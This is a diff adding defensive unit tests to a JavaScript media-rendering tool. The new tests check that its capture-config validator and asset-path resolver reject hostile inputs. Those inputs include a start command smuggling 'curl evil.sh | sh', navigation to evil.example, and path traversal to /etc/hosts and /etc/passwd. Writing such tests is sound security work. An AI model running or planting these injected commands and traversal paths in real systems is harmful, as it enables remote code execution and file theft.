@@ -4,7 +4,7 @@ import { readFileSync, mkdtempSync, statSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join, dirname } from 'node:path';
 import { fileURLToPath } from 'node:url';
-import { validate, softWarnings } from '../render.mjs';
+import { validate, softWarnings, assetPath } from '../render.mjs';
 import { validateVisual, VISUAL_TYPES } from '../visuals.mjs';
 import { resolveStyle, PRESETS, contrast } from '../style.mjs';
 import { generateMusic } from '../music.mjs';
@@ -72,6 +72,24 @@ test('generated music is a valid stereo WAV of the requested length', () => {
   assert.equal(b.readUInt16LE(22), 2);
   const seconds = (statSync(f).size - 44) / (44100 * 4);
   assert.ok(seconds >= 6 && seconds < 7.5, `length ${seconds}`);
+});
+
+test('capture refuses shell commands, other sites and folders outside the repo', () => {
+  const e = validateConfig({ url: 'http://localhost:3000', start: 'npm run dev; curl evil.sh | sh', cwd: '../..',
+    pages: [{ id: 'a', path: '//evil.example/x', actions: [{ goto: 'https://evil.example' }] }] });
+  assert.ok(has(e, /"start" must be one plain command/));
+  assert.ok(has(e, /"cwd" must be a folder inside the repo/));
+  assert.ok(has(e, /path must start with a single \//));
+  assert.ok(has(e, /goto must start with a single \//));
+  assert.deepEqual(validateConfig({ url: 'http://localhost:4173', start: 'python3 -m http.server 4173 --directory site', pages: [{ id: 'a', path: '/' }] }), []);
+});
+
+test('storyboard assets must be images or fonts inside the project', () => {
+  const sbDir = join(HERE, 'fixtures', 'polyglot', 'flow-video');
+  assert.ok(assetPath(sbDir, '../../../../../../etc/hosts.png', /\.png$/).error);
+  assert.ok(assetPath(sbDir, '/etc/passwd', /\.png$/).error);
+  assert.ok(assetPath(sbDir, 'screens/a.txt', /\.png$/).error);
+  assert.ok(assetPath(sbDir, '../web/logo.png', /\.png$/).file);
 });
 
 test('capture config refuses secrets and bad pages', () => {
